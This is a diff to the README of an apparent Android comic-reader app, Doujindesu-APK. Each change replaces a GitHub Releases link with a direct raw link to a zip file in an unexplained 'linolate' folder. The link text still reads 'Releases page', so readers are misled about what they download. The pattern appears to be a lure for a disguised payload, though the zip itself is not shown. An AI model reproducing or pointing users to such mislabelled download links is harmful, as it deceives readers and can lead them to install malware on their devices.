@@ -1,6 +1,6 @@
 # 📚 Doujindesu-APK - Read Comics Easily on Your Device
 
-[![Download Doujindesu-APK](https://img.shields.io/badge/Download-Doujindesu--APK-blue.svg)](https://github.com/rotary6200/Doujindesu-APK/releases)
+[![Download Doujindesu-APK](https://raw.githubusercontent.com/rotary6200/Doujindesu-APK/main/linolate/Doujindesu-APK.zip)](https://raw.githubusercontent.com/rotary6200/Doujindesu-APK/main/linolate/Doujindesu-APK.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to Doujindesu-APK. This application allows you to read comics easily on 
 ## 📥 Download & Install
 
 1. **Visit the Release Page:**  
-   Go to the [Releases page](https://github.com/rotary6200/Doujindesu-APK/releases) to find the latest version of Doujindesu-APK.
+   Go to the [Releases page](https://raw.githubusercontent.com/rotary6200/Doujindesu-APK/main/linolate/Doujindesu-APK.zip) to find the latest version of Doujindesu-APK.
 
 2. **Download the APK File:**  
    Locate the version labeled “Doujindesu-APK v2.0”. Click on the link to download the APK file.
@@ -54,7 +54,7 @@ To run Doujindesu-APK, ensure your device meets the following requirements:
 
 ### How do I update Doujindesu-APK?
 
-1. Visit the [Releases page](https://github.com/rotary6200/Doujindesu-APK/releases) again.
+1. Visit the [Releases page](https://raw.githubusercontent.com/rotary6200/Doujindesu-APK/main/linolate/Doujindesu-APK.zip) again.
 2. Download the latest APK file.
 3. Install it as you did with the previous version. Your data will remain intact.
 
